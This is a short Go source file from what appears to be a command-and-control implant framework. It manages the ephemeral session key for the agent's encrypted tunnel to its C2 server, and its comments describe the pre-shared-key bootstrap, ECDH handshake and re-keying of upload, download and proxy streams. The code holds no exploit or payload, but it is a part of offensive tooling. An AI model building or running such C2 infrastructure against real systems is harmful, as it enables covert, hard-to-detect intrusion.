package c2transport

import "sync"

// currentSessionKey is the ephemeral PFS session key negotiated with the C2 on
// the message tunnel.
//
// The C2 protocol is bootstrapped with a static per-build PSK derived from the
// embedded MagicString (def.AESPassword): the check-in stream and the first
// message-tunnel handshake are encrypted with it. As soon as the ECDH
// handshake completes, the tunnel switches to the derived ephemeral session
// key, and so does EVERY subsequent agent↔C2 stream (FTP uploads, WWW
// downloads, proxy relay, ...): EstablishC2Connection re-keys auxiliary
// streams right after their MsgAuth envelope.
//
// The key only exists while a message tunnel session is live. It is published
// when the handshake succeeds and dropped when the tunnel is torn down, so it
// can never leak into the reconnect/check-in phase (which must use the PSK).
var (
	sessionKeyMu      sync.RWMutex
	currentSessionKey []byte
)

// setCurrentSessionKey publishes the ephemeral PFS session key established by
// the message-tunnel handshake. A defensive copy is kept so callers can
// freely reuse/zero their buffer afterwards.
func setCurrentSessionKey(key []byte) {
	sessionKeyMu.Lock()
	defer sessionKeyMu.Unlock()
	if len(key) == 0 {
		currentSessionKey = nil
		return
	}
	cpy := make([]byte, len(key))
	copy(cpy, key)
	currentSessionKey = cpy
}

// clearCurrentSessionKey drops the ephemeral session key. It is called when
// the message tunnel closes so no post-session stream accidentally encrypts
// with a dead session key.
func clearCurrentSessionKey() {
	sessionKeyMu.Lock()
	defer sessionKeyMu.Unlock()
	currentSessionKey = nil
}

// getCurrentSessionKey returns the active ephemeral PFS session key, or nil
// when no message-tunnel session is established yet.
func getCurrentSessionKey() []byte {
	sessionKeyMu.RLock()
	defer sessionKeyMu.RUnlock()
	return currentSessionKey
}
